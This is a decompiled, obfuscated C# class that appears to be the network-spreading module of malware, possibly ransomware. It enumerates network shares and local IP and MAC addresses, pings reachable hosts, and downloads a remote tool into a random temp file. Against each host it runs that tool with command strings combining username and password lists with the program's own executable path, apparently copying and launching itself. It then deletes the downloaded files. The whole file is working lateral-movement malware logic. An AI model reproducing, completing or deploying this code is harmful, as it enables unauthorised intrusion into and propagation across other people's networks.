using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

internal sealed class coBWxmnoGcnU
{
	public enum hyDrOUCkYT
	{
		KTbMTzKugKtNxf = 1,
		DLaTJplbZVY,
		GtlkabmCZeScOXn,
		BDoGJvtkqO,
		RqYlgsQgbQ
	}

	public enum SwfWvSoMYlL
	{
		shjjZHmKVFcP,
		RrEozFbQfhI,
		vWFZgTvkhfr,
		mdizbjaehOUW
	}

	public enum KmJJJvVPCXqCz
	{
		VMzwMCgQhpU = 1,
		fBxxDUrqOgq = 2,
		wikluHWfFxlWm = 4,
		QlglZqXacPIUYBx = 8,
		tAyZTQcEGi = 16,
		JcshpWWwRSD = 19
	}

	public enum qdjgOnHQYa
	{
		uaepdWpSBZxDJj,
		cvRtwWcQICaNAi,
		NHhRRqLjcPL,
		cZTMuPSqbV,
		XkIhbnKIaQBJ,
		YcdVnyHeFDdkA,
		vfvBVtHDXZeZ,
		rIgijRmxXJbOmKLB,
		KphKseoKEl,
		DhdauEujWbFnk,
		MjTRfpJTrd,
		QqCFUHJwIkR
	}

	public sealed class CbNJxJXghLZ : IEnumerable
	{
		private enum vtmjooEhCfwdH
		{
			EvCaNqDzEUS = 0,
			cKMuzVJTJw = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class jlUKJpCSpSG
		{
			public hyDrOUCkYT aFaIEPJgSwSPNdWnNs = (hyDrOUCkYT)0;

			public SwfWvSoMYlL EqfutNuLpRBI = SwfWvSoMYlL.shjjZHmKVFcP;

			public qdjgOnHQYa oMEHMvzJRWOSAVp = qdjgOnHQYa.uaepdWpSBZxDJj;

			public KmJJJvVPCXqCz iHyfeCCqbiz = (KmJJJvVPCXqCz)0;

			public string qwhwsXpxcktfpN = null;

			public string wCCjDGwhid = null;

			public string DeKQaGftfG = null;

			public string OErNeSLPxQLlmm = null;
		}

		private ArrayList kUoctfqsmTao = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern vtmjooEhCfwdH WNetOpenEnumA(hyDrOUCkYT dwScope, SwfWvSoMYlL dwType, KmJJJvVPCXqCz dwUsage, jlUKJpCSpSG p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern vtmjooEhCfwdH WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern vtmjooEhCfwdH WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(jlUKJpCSpSG jlUKJpCSpSG_0, hyDrOUCkYT hyDrOUCkYT_0, SwfWvSoMYlL swfWvSoMYlL_0, KmJJJvVPCXqCz kmJJJvVPCXqCz_0, qdjgOnHQYa qdjgOnHQYa_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(hyDrOUCkYT_0, swfWvSoMYlL_0, kmJJJvVPCXqCz_0, jlUKJpCSpSG_0, out lphEnum) == vtmjooEhCfwdH.EvCaNqDzEUS)
			{
				vtmjooEhCfwdH vtmjooEhCfwdH;
				do
				{
					vtmjooEhCfwdH = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (vtmjooEhCfwdH)
					{
					case vtmjooEhCfwdH.cKMuzVJTJw:
						continue;
					case vtmjooEhCfwdH.EvCaNqDzEUS:
						Marshal.PtrToStructure(intPtr, jlUKJpCSpSG_0);
						if (jlUKJpCSpSG_0.oMEHMvzJRWOSAVp == qdjgOnHQYa_0)
						{
							kUoctfqsmTao.Add(jlUKJpCSpSG_0.wCCjDGwhid);
						}
						if ((jlUKJpCSpSG_0.iHyfeCCqbiz & KmJJJvVPCXqCz.fBxxDUrqOgq) == KmJJJvVPCXqCz.fBxxDUrqOgq)
						{
							EnumerateServers(jlUKJpCSpSG_0, hyDrOUCkYT_0, swfWvSoMYlL_0, kmJJJvVPCXqCz_0, qdjgOnHQYa_0);
						}
						continue;
					}
					break;
				}
				while (vtmjooEhCfwdH != vtmjooEhCfwdH.cKMuzVJTJw);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public CbNJxJXghLZ(hyDrOUCkYT hyDrOUCkYT_0, SwfWvSoMYlL swfWvSoMYlL_0, KmJJJvVPCXqCz kmJJJvVPCXqCz_0, qdjgOnHQYa qdjgOnHQYa_0)
		{
			jlUKJpCSpSG jlUKJpCSpSG_ = new jlUKJpCSpSG();
			EnumerateServers(jlUKJpCSpSG_, hyDrOUCkYT_0, swfWvSoMYlL_0, kmJJJvVPCXqCz_0, qdjgOnHQYa_0);
		}

		public IEnumerator GetEnumerator()
		{
			return kUoctfqsmTao.GetEnumerator();
		}
	}

	private sealed class jZovPaIqOnuwG
	{
		public string wtBwVAiyLGaXAj;

		public string VUMhbxehSp;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107385617)) && !string_0.StartsWith(getString_0(107385612)) && !string_0.StartsWith(getString_0(107385571)) && !string_0.Contains(getString_0(107389317))) || !rMZPfYootxOJU(string_0))
			{
				return;
			}
			if (FcnBvlzKWyQDwH.gQGxNFPuSnfa == getString_0(107397059))
			{
				for (int i = 0; i < gFPAtZhFMpwOux.Count; i++)
				{
					if (FcnBvlzKWyQDwH.PDbIQyycteW)
					{
						if (File.Exists(wtBwVAiyLGaXAj))
						{
							FcnBvlzKWyQDwH.QKkRdHWXNelGs(wtBwVAiyLGaXAj, getString_0(107387958) + string_0 + getString_0(107410830) + gFPAtZhFMpwOux[i] + getString_0(107410789) + XGpEwAnImHBP[i] + getString_0(107410780) + Assembly.GetEntryAssembly()!.Location + getString_0(107388748));
						}
					}
					else if (File.Exists(VUMhbxehSp))
					{
						FcnBvlzKWyQDwH.QKkRdHWXNelGs(VUMhbxehSp, getString_0(107387958) + string_0 + getString_0(107410830) + gFPAtZhFMpwOux[i] + getString_0(107410789) + XGpEwAnImHBP[i] + getString_0(107410747) + Assembly.GetEntryAssembly()!.Location + getString_0(107388748));
					}
				}
			}
			else if (FcnBvlzKWyQDwH.PDbIQyycteW)
			{
				if (File.Exists(wtBwVAiyLGaXAj))
				{
					FcnBvlzKWyQDwH.QKkRdHWXNelGs(wtBwVAiyLGaXAj, getString_0(107387958) + string_0 + getString_0(107410690) + Assembly.GetEntryAssembly()!.Location + getString_0(107388748));
				}
			}
			else if (File.Exists(VUMhbxehSp))
			{
				FcnBvlzKWyQDwH.QKkRdHWXNelGs(VUMhbxehSp, getString_0(107387958) + string_0 + getString_0(107410657) + Assembly.GetEntryAssembly()!.Location + getString_0(107388748));
			}
		}

		static jZovPaIqOnuwG()
		{
			Strings.CreateGetStringDelegate(typeof(jZovPaIqOnuwG));
		}
	}

	public static List<string> anYXKrVgTChGLZ;

	public static string TGDcKrMflkgRv;

	public static List<string> gFPAtZhFMpwOux;

	public static List<string> XGpEwAnImHBP;

	public static List<string> csPvzwGDOnwk;

	public List<string> IYCTxzKfMqxV = new List<string>();

	public List<string> gsMcdYcLRkZU = new List<string>();

	public List<string> ekYTRSDCuhbU = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void pcFKJWPqNqp()
	{
		jZovPaIqOnuwG CS_0024_003C_003E8__locals0 = new jZovPaIqOnuwG();
		FcnBvlzKWyQDwH.BiVWcARNBVibS();
		List<OjnisleDhCtqP> list = OjnisleDhCtqP.XRIvuWSIGVLO();
		foreach (OjnisleDhCtqP item in list)
		{
			anYXKrVgTChGLZ.Add(item.IPAddress);
		}
		if (FcnBvlzKWyQDwH.ASvnhkEKlK.Count > 0)
		{
			anYXKrVgTChGLZ = anYXKrVgTChGLZ.Union(FcnBvlzKWyQDwH.ASvnhkEKlK).ToList();
		}
		CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj = getString_0(107389271);
		CS_0024_003C_003E8__locals0.VUMhbxehSp = getString_0(107389271);
		try
		{
			CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj = RLvlNoWvgR();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.VUMhbxehSp = pRZXwtEZjrQQHCag();
		}
		catch
		{
		}
		foreach (OjnisleDhCtqP item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107385571)) || item2.IPAddress.StartsWith(getString_0(107385566)) || item2.IPAddress.StartsWith(getString_0(107385525)) || item2.IPAddress.Contains(getString_0(107389271)))
				{
					LIzxqVezjdwEa.DLfIpVEcNZpI(item2.MacAddress, item2.IPAddress, getString_0(107411530));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(anYXKrVgTChGLZ, delegate(string string_0)
			{
				if ((string_0.StartsWith(jZovPaIqOnuwG.getString_0(107385617)) || string_0.StartsWith(jZovPaIqOnuwG.getString_0(107385612)) || string_0.StartsWith(jZovPaIqOnuwG.getString_0(107385571)) || string_0.Contains(jZovPaIqOnuwG.getString_0(107389317))) && rMZPfYootxOJU(string_0))
				{
					if (FcnBvlzKWyQDwH.gQGxNFPuSnfa == jZovPaIqOnuwG.getString_0(107397059))
					{
						for (int i = 0; i < gFPAtZhFMpwOux.Count; i++)
						{
							if (FcnBvlzKWyQDwH.PDbIQyycteW)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj))
								{
									FcnBvlzKWyQDwH.QKkRdHWXNelGs(CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj, jZovPaIqOnuwG.getString_0(107387958) + string_0 + jZovPaIqOnuwG.getString_0(107410830) + gFPAtZhFMpwOux[i] + jZovPaIqOnuwG.getString_0(107410789) + XGpEwAnImHBP[i] + jZovPaIqOnuwG.getString_0(107410780) + Assembly.GetEntryAssembly()!.Location + jZovPaIqOnuwG.getString_0(107388748));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.VUMhbxehSp))
							{
								FcnBvlzKWyQDwH.QKkRdHWXNelGs(CS_0024_003C_003E8__locals0.VUMhbxehSp, jZovPaIqOnuwG.getString_0(107387958) + string_0 + jZovPaIqOnuwG.getString_0(107410830) + gFPAtZhFMpwOux[i] + jZovPaIqOnuwG.getString_0(107410789) + XGpEwAnImHBP[i] + jZovPaIqOnuwG.getString_0(107410747) + Assembly.GetEntryAssembly()!.Location + jZovPaIqOnuwG.getString_0(107388748));
							}
						}
					}
					else if (FcnBvlzKWyQDwH.PDbIQyycteW)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj))
						{
							FcnBvlzKWyQDwH.QKkRdHWXNelGs(CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj, jZovPaIqOnuwG.getString_0(107387958) + string_0 + jZovPaIqOnuwG.getString_0(107410690) + Assembly.GetEntryAssembly()!.Location + jZovPaIqOnuwG.getString_0(107388748));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.VUMhbxehSp))
					{
						FcnBvlzKWyQDwH.QKkRdHWXNelGs(CS_0024_003C_003E8__locals0.VUMhbxehSp, jZovPaIqOnuwG.getString_0(107387958) + string_0 + jZovPaIqOnuwG.getString_0(107410657) + Assembly.GetEntryAssembly()!.Location + jZovPaIqOnuwG.getString_0(107388748));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj))
			{
				File.Delete(CS_0024_003C_003E8__locals0.wtBwVAiyLGaXAj);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.VUMhbxehSp))
			{
				File.Delete(CS_0024_003C_003E8__locals0.VUMhbxehSp);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string RLvlNoWvgR()
	{
		if (IntPtr.Size == 8)
		{
			return XlROhdRmQOQyy(new Uri(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107411509))));
		}
		return XlROhdRmQOQyy(new Uri(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107411509))));
	}

	public static string pRZXwtEZjrQQHCag()
	{
		if (IntPtr.Size == 8)
		{
			return XlROhdRmQOQyy(new Uri(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107411460))));
		}
		return XlROhdRmQOQyy(new Uri(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107410839))));
	}

	public static bool rMZPfYootxOJU(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string XlROhdRmQOQyy(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107410766), getString_0(107389271)).Remove(0, 3) + getString_0(107410761);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static coBWxmnoGcnU()
	{
		Strings.CreateGetStringDelegate(typeof(coBWxmnoGcnU));
		anYXKrVgTChGLZ = new List<string>();
		TGDcKrMflkgRv = getString_0(107389271);
		gFPAtZhFMpwOux = new List<string>();
		XGpEwAnImHBP = new List<string>();
		csPvzwGDOnwk = new List<string>();
	}
}
